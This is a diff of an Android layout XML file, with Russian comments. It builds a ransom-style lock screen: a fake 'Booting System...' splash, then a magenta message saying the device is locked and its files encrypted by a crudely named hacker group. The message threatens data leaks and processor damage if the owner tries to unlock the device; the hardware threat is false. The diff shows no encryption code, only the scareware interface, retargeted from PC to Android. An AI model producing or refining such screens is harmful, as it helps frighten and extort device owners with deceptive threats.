@@ -17,15 +17,30 @@
         android:fontFamily="monospace"
         android:textSize="18sp" />
 
+    <!-- Экран загрузки и логотип -->
+    <TextView
+        android:id="@+id/bootText"
+        android:layout_width="match_parent"
+        android:layout_height="match_parent"
+        android:gravity="center"
+        android:text="Booting System..."
+        android:textColor="#FF00FF"
+        android:fontFamily="monospace"
+        android:textSize="20sp" />
+
+    <!-- Основной блок с текстом (скрыт изначально) -->
     <LinearLayout
+        android:id="@+id/mainBlock"
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
         android:layout_centerInParent="true"
         android:orientation="vertical"
         android:padding="20dp"
-        android:background="@drawable/box_bg">
+        android:background="@drawable/box_bg"
+        android:visibility="gone">
 
         <TextView
+            android:id="@+id/headerText"
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
             android:text="[Ваша система заблокирована!]"
@@ -40,7 +55,7 @@
         <TextView
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:text="Ваш компьютер заблокирован, а все имеющиеся диски и файлы на них зашифрованы хакерской группировкой P I D O R I. Любые действия, связанные с попыткой снятия блокировки нанесут непоправимый вред Вашему компьютеру и приведут к потере всех важных файлов без возможности восстановления. При попытке снять блокировку все ваши данные будут выгружены в сеть и будет подана рекурсивная нагрузка на ваш процессор, что приведет к его неисправности."
+            android:text="Ваш Андроид заблокирован, а все имеющиеся диски и файлы на них зашифрованы хакерской группировкой P I D O R I. Любые действия, связанные с попыткой снятия блокировки нанесут непоправимый вред Вашему Андроиду и приведут к потере всех важных файлов без возможности восстановления. При попытке снять блокировку все ваши данные будут выгружены в сеть и будет подана рекурсивная нагрузка на ваш процессор, что приведет к его неисправности."
             android:textColor="#FF00FF"
             android:fontFamily="monospace"
             android:textSize="12sp"
@@ -101,7 +116,7 @@
             <TextView
                 android:layout_width="wrap_content"
                 android:layout_height="wrap_content"
-                android:text="Current PC: 333"
+                android:text="Current Android: 333"
                 android:textColor="#FF00FF"
                 android:fontFamily="monospace"
                 android:textSize="12sp"/>
